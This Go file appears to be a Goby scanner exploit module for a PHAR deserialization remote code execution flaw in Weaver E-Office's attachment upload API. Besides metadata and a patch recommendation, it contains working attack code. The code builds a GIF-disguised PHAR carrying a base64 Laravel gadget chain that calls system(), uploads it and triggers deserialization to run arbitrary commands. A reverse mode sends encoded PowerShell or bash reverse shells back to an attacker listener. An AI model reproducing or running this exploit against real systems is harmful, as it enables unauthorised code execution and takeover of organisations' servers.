package exploits

import (
	"bytes"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver-E Office /eoffice10/server/public/api/attachment/atuh-file Code Execution Vulnerability",
    "Description": "<p>The key to the vulnerability is that the system has defects in processing uploaded PHAR files. Attackers can upload disguised PHAR files to the server and use the automatic deserialization mechanism when PHP processes PHAR files to trigger remote code execution.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-03-27",
    "PostTime": "2024-04-02",
    "Author": "Town",
    "FofaQuery": "body=\"href=\\\"/eoffice10/client/web/\" || body=\"href=\\\"/eoffice/client/web/\" || body=\"eoffice_loading_tip\"",
    "GobyQuery": "body=\"href=\\\"/eoffice10/client/web/\" || body=\"href=\\\"/eoffice/client/web/\" || body=\"eoffice_loading_tip\"",
    "Level": "3",
    "Impact": "<p>Pan-micro E-Office /eoffice10/server/public/api/attachment/atuh-file can upload Phar files. Attackers can upload disguised PHAR files to the server, and use the automatic deserialization mechanism when PHP processes PHAR files to trigger remote code execution.</p>",
    "Recommendation": "<p>The official has released a new version to fix the vulnerability. It is recommended to use the service management platform to upgrade to the latest version as soon as possible or visit the official website to download the offline upgrade patch (<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a>) to obtain the version upgrade installation package or patch.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Model",
            "type": "select",
            "value": "Exec,Reverse",
            "show": ""
        },
        {
            "name": "Cmd",
            "type": "input",
            "value": "whoami",
            "show": "Model=Exec"
        },
        {
            "name": "reverseType",
            "type": "select",
            "value": "reverse_windows",
            "show": "Model=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "泛微E-Office /eoffice10/server/public/api/attachment/atuh-file 代码执行漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>漏洞的关键在于系统处理上传的PHAR文件时存在缺陷。攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行。<br></p>",
            "Recommendation": "<p>官方已发布新版本修复漏洞，建议尽快使用服务管理平台升级到最新版或访问官网下载离线升级补丁（<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a>）获取版本升级安装包或补丁。<br></p>",
            "Impact": "<p>泛微E-Office /eoffice10/server/public/api/attachment/atuh-file可以上传Phar文件，攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weaver-E Office /eoffice10/server/public/api/attachment/atuh-file Code Execution Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>The key to the vulnerability is that the system has defects in processing uploaded PHAR files. Attackers can upload disguised PHAR files to the server and use the automatic deserialization mechanism when PHP processes PHAR files to trigger remote code execution.<br><br></p>",
            "Recommendation": "<p>The official has released a new version to fix the vulnerability. It is recommended to use the service management platform to upgrade to the latest version as soon as possible or visit the official website to download the offline upgrade patch (<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a>) to obtain the version upgrade installation package or patch.<br></p>",
            "Impact": "<p>Pan-micro E-Office /eoffice10/server/public/api/attachment/atuh-file can upload Phar files. Attackers can upload disguised PHAR files to the server, and use the automatic deserialization mechanism when PHP processes PHAR files to trigger remote code execution.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10939"
}`
  	getRouterRootAKCrzsje := func(hostInfo *httpclient.FixUrl)(string){
		//构造Get请求
		getRequestConfig := httpclient.NewGetRequestConfig("/")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return ""
		}
		// 定义正则表达式
		re := regexp.MustCompile(`<base[^>]*\s+href="([^"]+)"[^>]*>`)
		match := re.FindStringSubmatch(resp.Utf8Html)
		if len(match) < 2 {
			return ""
		}
		return strings.Split(match[1], "/")[1]
	}

	sendPayloadFlagKWdJKP := func(hostInfo *httpclient.FixUrl, fileDate []byte) (string, error) {
		
		RouterRoot := getRouterRootAKCrzsje(hostInfo)
		//构造Post请求
		postRequestConfig := httpclient.NewPostRequestConfig("/" + RouterRoot + "/server/public/api/attachment/atuh-file")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=4d4afd39106fbc3f62f53064715fb7cf")
		//设置请求体
		postRequestConfig.Data = "--4d4afd39106fbc3f62f53064715fb7cf\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\nContent-Type: image/jpeg\n\n" + string(fileDate) + "\n--4d4afd39106fbc3f62f53064715fb7cf--\n"

		//请求
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		// 定义正则表达式
		re := regexp.MustCompile(`"attachment_id":"([^"]+)"`)
		match := re.FindStringSubmatch(resp.Utf8Html)
		if len(match) < 2 {
			return "", err
		}
		attachmentID := match[1]

		//构造Get请求
		postRequestConfig = httpclient.NewPostRequestConfig("/" + RouterRoot + "/server/public/api/attachment/path/migrate")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//设置请求体
		postRequestConfig.Data = "source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F"
		//请求
		_, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}

		//构造Get请求
		postRequestConfig = httpclient.NewPostRequestConfig("/" + RouterRoot + "/server/public/api/empower/import")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//设置请求体
		postRequestConfig.Data = "type=&file=" + attachmentID
		//请求
		_, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		resp, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		// 资源存在
		if resp.StatusCode != 200 {
			return "", errors.New("接口返回错误")
		}
		parts := strings.Split(resp.Utf8Html, "{")
		if len(parts) > 1 {
			return parts[0], nil
		} else {
			return "", errors.New("没有有效数据返回")
		}
	}

	genHashggpARI := func(mode int, buf []byte) (hash []byte) {
		switch mode {
		case 1:
			md5sum := md5.Sum(buf)
			return md5sum[:]
		case 2:
			sha1sum := sha1.Sum(buf)
			return sha1sum[:]
		case 3:
			sha256sum := sha256.Sum256(buf)
			return sha256sum[:]
		default:
			sha512sum := sha512.Sum512(buf)
			return sha512sum[:]
		}
	}

	BuildPharaBnwOx := func(Stub string, SerializationByte []byte, hashModel int) []byte {
		stubByte := []byte(Stub)
		metaDataLen := make([]byte, 4)
		binary.LittleEndian.PutUint32(metaDataLen, uint32(len(SerializationByte)))
		manifestMid := []byte{1, 0, 0, 0, 17, 0, 0, 0, 1, 0, 0, 0, 0, 0}
		fileX := []byte{8, 0, 0, 0, 116, 101, 115, 116, 46, 116, 120, 116, 4, 0, 0, 0, 103, 114, 179, 101, 4, 0, 0, 0, 12, 126, 127, 216, 164, 1, 0, 0, 0, 0, 0, 0, 116, 101, 115, 116}
		flag := []byte{0, 0, 0, 71, 66, 77, 66}
		// 数据总长度
		dataLen := make([]byte, 4)
		binary.LittleEndian.PutUint32(dataLen, uint32(len(SerializationByte)+len(manifestMid)+8))

		pharBuffer := bytes.NewBuffer([]byte{})
		pharBuffer.Write(stubByte)
		pharBuffer.Write(dataLen)
		pharBuffer.Write(manifestMid)
		pharBuffer.Write(metaDataLen)
		pharBuffer.Write(SerializationByte)
		pharBuffer.Write(fileX)
		hash := genHashggpARI(hashModel, pharBuffer.Bytes())
		pharBuffer.Write(hash)
		pharBuffer.Write([]byte{byte(hashModel)})
		pharBuffer.Write(flag)
		return pharBuffer.Bytes()
	}

	genSerializationRDdLYk := func(cmd string) []byte {
		payload := "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQ"
		payloadBuf, _ := base64.RawStdEncoding.DecodeString(payload)
		index := bytes.Index(payloadBuf, []byte("connection\";s:")) + len([]byte("connection\";s:"))
		Data1 := payloadBuf[:index]
		Data2 := payloadBuf[index+1 : index+3]
		Data3 := payloadBuf[len(payloadBuf)-4:]
		cmdBuf := []byte(cmd)
		cmdBufLen := []byte(strconv.Itoa(len(cmdBuf)))
		var serialization = bytes.NewBuffer([]byte{})
		serialization.Write(Data1)
		serialization.Write(cmdBufLen)
		serialization.Write(Data2)
		serialization.Write(cmdBuf)
		serialization.Write(Data3)
		return serialization.Bytes()
	}

	setReverseRequestHashCGFYVM := func(reverseType string, isBase64 bool) (string, chan string, error) {
		typeList := map[string]string{
			"reverse_windows": "reverse_windows",
			"reverse_linux":   "reverse_linux_none",
		}
		if revserTypeNew := typeList[reverseType]; revserTypeNew == "" {
			return "", nil, errors.New("reverse type error")
		}
		waitSessionCh := make(chan string)
		if rp, err := godclient.WaitSession(reverseType, waitSessionCh); err != nil || len(rp) >= 0 {
			if reverseType == "reverse_windows" {
				command := godclient.ReverseTCPByPowershell(rp)
				if isBase64 {
					utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
					buf := make([]byte, len(utf16Bytes)*2)
					for i, v := range utf16Bytes {
						buf[i*2] = byte(v)
						buf[i*2+1] = byte(v >> 8)
					}
					command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e " + base64.StdEncoding.EncodeToString(buf)
				}
				return command, waitSessionCh, nil
			} else if reverseType == "reverse_linux" {
				command := godclient.ReverseTCPByBash(rp)
				if isBase64 {
					command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
				}
				return command, waitSessionCh, nil
			}
		}
		return "", waitSessionCh, errors.New("reverse port error")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			pharFileData := BuildPharaBnwOx("GIF89a<?php __HALT_COMPILER(); ?>\r\n", genSerializationRDdLYk("echo "+checkStr), 3)
			rsp, err := sendPayloadFlagKWdJKP(hostInfo, pharFileData)
			if err != nil {
				return false
			}
			//设置扫描完成URL
			ss.VulURL = hostInfo.FixedHostInfo + "/"+getRouterRootAKCrzsje(hostInfo)+"/server/public/api/empower/import"
			return strings.Contains(rsp, checkStr)
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			switch ss.Params["Model"].(string) {
			case "Exec":
				cmd := ss.Params["Cmd"].(string)
				NewSerializationByte := genSerializationRDdLYk(cmd)
				payload := BuildPharaBnwOx("GIF89a<?php __HALT_COMPILER(); ?>\r\n", NewSerializationByte, 3)
				result, err := sendPayloadFlagKWdJKP(expResult.HostInfo, payload)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				//设置输出
				expResult.Success = true
				expResult.Output = result
				return expResult
			case "Reverse":
				reverseType := ss.Params["reverseType"].(string)
				if command, waitSessionCh, err := setReverseRequestHashCGFYVM(reverseType, true); command != "" {
					payload := BuildPharaBnwOx("GIF89a<?php __HALT_COMPILER(); ?>\r\n", genSerializationRDdLYk(command), 3)
					go sendPayloadFlagKWdJKP(expResult.HostInfo, payload)
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
				return expResult
			default:
				expResult.Success = false
				expResult.Output = "错误的利用类型"
				return expResult
			}
		},
	))
}
